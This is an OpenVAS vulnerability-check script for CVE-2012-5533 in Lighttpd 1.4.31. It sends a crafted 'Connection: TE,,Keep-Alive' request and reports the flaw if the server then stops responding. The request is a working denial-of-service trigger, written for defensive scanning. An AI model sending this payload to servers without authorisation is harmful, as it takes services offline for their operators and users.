###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_lighttpd_connection_hdr_dos_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Lighttpd Connection header Denial of Service Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to cause a denial of service
  via crafted Connection header values.
  Impact Level: Application";
tag_affected = "Lighttpd version 1.4.31";
tag_insight = "The flaw is due to an error when processing certain Connection header values
  leading to enter in an endless loop denying further request processing.";
tag_solution = "Upgrade to 1.4.32 or apply the patch from,
  http://download.lighttpd.net/lighttpd/security/lighttpd-1.4.31_fix_connection_header_dos.patch";
tag_summary = "The host is running Lighttpd HTTP Server and is prone to denial of
  service vulnerability.";

if(description)
{
  script_id(802044);
  script_version("$Revision: 12 $");
  script_bugtraq_id(56619);
  script_cve_id("CVE-2012-5533");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-11-23 10:59:35 +0530 (Fri, 23 Nov 2012)");
  script_name("Lighttpd Connection header Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://seclists.org/oss-sec/2012/q4/320");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/22902");
  script_xref(name : "URL" , value : "http://www.lighttpd.net/2012/11/21/1-4-32");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2012/Nov/156");
  script_xref(name : "URL" , value : "http://download.lighttpd.net/lighttpd/security/lighttpd_sa_2012_01.txt");

  script_description(desc);
  script_summary("Check if Lighttpd HTTP Server is vulnerable Connection header DoS");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

## Variable Initialization
port = 0;
banner = "";
dos_req = "";
dos_res = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if(!banner || "Server: lighttpd" >!< banner){
  exit(0);
}

## Construct crafted request
dos_req = string( "GET / HTTP/1.1\r\n",
                  "Host: ", get_host_name(), "\r\n",
                  "Connection: TE,,Keep-Alive\r\n\r\n" );

## Send crafted request
dos_res = http_send_recv(port:port, data:dos_req);
sleep(2);

## Confirm Tiny HTTP Server is dead
if(http_is_dead(port:port)){
  security_hole(port);
}
